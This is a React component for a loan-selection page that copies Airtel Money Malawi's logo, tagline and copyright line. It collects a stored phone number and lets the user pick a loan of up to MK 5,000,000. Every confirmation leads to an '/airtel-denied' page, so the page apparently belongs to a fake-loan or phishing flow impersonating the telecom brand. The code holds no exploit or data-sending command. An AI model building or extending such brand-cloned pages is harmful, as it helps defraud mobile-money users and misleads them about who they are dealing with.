import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';

const MIN_LOAN = 100_000;
const MAX_LOAN = 5_000_000;
const STEP = 100_000;

function AirtelLoanLimit() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [loanAmount, setLoanAmount] = useState(1_000_000);

  useEffect(() => {
    const savedPhone = localStorage.getItem('airtelPhone') || '';
    setPhone(savedPhone.replace('+265', '').replace('+', ''));
  }, []);

  const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setLoanAmount(Number(e.target.value));
  };

  const handleQuickSelect = (amount: number) => {
    setLoanAmount(amount);
  };

  const handleConfirm = () => {
    localStorage.setItem('airtelLoanAmount', String(loanAmount));
    navigate('/airtel-denied');
  };

  const handleReturnHome = () => {
    localStorage.removeItem('airtelLoanAmount');
    localStorage.removeItem('airtelPhone');
    navigate('/');
  };

  const formatMK = (amount: number) => amount.toLocaleString('en-US');

  const percent = ((loanAmount - MIN_LOAN) / (MAX_LOAN - MIN_LOAN)) * 100;

  return (
    <div className="airtel-loan-container">
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .airtel-loan-container { display: flex; flex-direction: column; min-height: 100vh; background-color: #F8F9FA; }
        .loan-header { background-color: #ffffff; padding: 16px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #E5E7EB; }
        .back-btn { background: none; border: none; cursor: pointer; padding: 8px; display: flex; align-items: center; justify-content: center; }
        .logo-wrapper { display: flex; flex-direction: column; align-items: center; }
        .tagline { font-size: 8px; letter-spacing: 1px; color: #333; text-transform: uppercase; margin-top: 4px; font-weight: 600; }
        .tagline span { color: #DA1C1C; }
        .loan-main { flex: 1; padding: 32px 24px; display: flex; flex-direction: column; align-items: center; }
        .loan-card { background-color: #ffffff; width: 100%; max-width: 420px; border-radius: 20px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06); border: 1px solid #F3F4F6; }
        .loan-title { font-size: 24px; font-weight: 800; color: #1a1a1a; text-align: center; margin-bottom: 8px; }
        .loan-subtitle { font-size: 14px; color: #6B7280; text-align: center; margin-bottom: 24px; line-height: 1.5; }
        .phone-display { text-align: center; font-size: 13px; color: #6B7280; margin-bottom: 20px; }
        .phone-display strong { color: #1a1a1a; }
        .amount-display { display: flex; align-items: baseline; justify-content: center; gap: 8px; margin-bottom: 24px; padding: 20px; background-color: #FEF2F2; border-radius: 16px; border: 1px solid #FECACA; }
        .currency-label { font-size: 20px; font-weight: 800; color: #DA1C1C; }
        .amount-value { font-size: 40px; font-weight: 900; color: #DA1C1C; letter-spacing: -1px; }
        .slider-wrapper { width: 100%; margin-bottom: 24px; }
        .loan-slider { -webkit-appearance: none; appearance: none; width: 100%; height: 8px; border-radius: 4px; outline: none; margin: 8px 0; cursor: pointer; }
        .loan-slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 28px; height: 28px; border-radius: 50%; background: #DA1C1C; border: 3px solid #ffffff; box-shadow: 0 2px 8px rgba(218, 28, 28, 0.4); cursor: pointer; }
        .loan-slider::-moz-range-thumb { width: 28px; height: 28px; border-radius: 50%; background: #DA1C1C; border: 3px solid #ffffff; box-shadow: 0 2px 8px rgba(218, 28, 28, 0.4); cursor: pointer; }
        .slider-labels { display: flex; justify-content: space-between; font-size: 12px; color: #9CA3AF; font-weight: 600; margin-top: 8px; }
        .quick-amounts { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-bottom: 28px; }
        .quick-btn { padding: 8px 14px; border-radius: 20px; border: 1.5px solid #E5E7EB; background-color: #ffffff; color: #4B5563; font-size: 13px; font-weight: 700; cursor: pointer; transition: all 0.2s; }
        .quick-btn.selected { background-color: #DA1C1C; border-color: #DA1C1C; color: #ffffff; }
        .quick-btn:hover { border-color: #DA1C1C; }
        .confirm-btn { width: 100%; padding: 18px; border-radius: 30px; border: none; background-color: #DA1C1C; color: #ffffff; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: background-color 0.2s; margin-bottom: 16px; }
        .confirm-btn:active { background-color: #B91414; }
        .terms-text { font-size: 12px; color: #9CA3AF; text-align: center; line-height: 1.5; }
        .loan-footer { padding: 24px; text-align: center; color: #9CA3AF; font-size: 12px; }
      `}</style>

      <div className="loan-header">
        <button className="back-btn" onClick={handleReturnHome}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12" />
            <polyline points="12 19 5 12 12 5" />
          </svg>
        </button>
        <div className="logo-wrapper">
          <svg width="100" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
            <circle cx="25" cy="17" r="5" fill="white"/>
            <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
          </svg>
          <p className="tagline">A REASON TO <span>IMAGINE</span></p>
        </div>
        <div style={{ width: 40 }} />
      </div>

      <div className="loan-main">
        <div className="loan-card">
          <h1 className="loan-title">Choose Your Loan Amount</h1>
          <p className="loan-subtitle">
            Select the amount you want to borrow. You can choose between MK 100,000 and MK 5,000,000.
          </p>

          {phone && (
            <p className="phone-display">
              For phone number: <strong>+265 {phone}</strong>
            </p>
          )}

          <div className="amount-display">
            <span className="currency-label">MK</span>
            <span className="amount-value">{formatMK(loanAmount)}</span>
          </div>

          <div className="slider-wrapper">
            <input
              type="range"
              min={MIN_LOAN}
              max={MAX_LOAN}
              step={STEP}
              value={loanAmount}
              onChange={handleSliderChange}
              className="loan-slider"
              style={{
                background: `linear-gradient(to right, #DA1C1C ${percent}%, #E5E7EB ${percent}%)`,
              }}
            />
            <div className="slider-labels">
              <span>MK 100,000</span>
              <span>MK 5,000,000</span>
            </div>
          </div>

          <div className="quick-amounts">
            {[500000, 1000000, 2000000, 3000000, 5000000].map((amt) => (
              <button
                key={amt}
                className={`quick-btn ${loanAmount === amt ? 'selected' : ''}`}
                onClick={() => handleQuickSelect(amt)}
              >
                {formatMK(amt)}
              </button>
            ))}
          </div>

          <button className="confirm-btn" onClick={handleConfirm}>
            Confirm Loan Amount
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="12 5 19 12 12 19" />
            </svg>
          </button>

          <p className="terms-text">
            By confirming, you agree to Airtel Money's loan terms and conditions. Interest and fees apply.
          </p>
        </div>
      </div>

      <div className="loan-footer">
        © 2026 Airtel Malawi. All rights reserved.
      </div>
    </div>
  );
}

export default AirtelLoanLimit;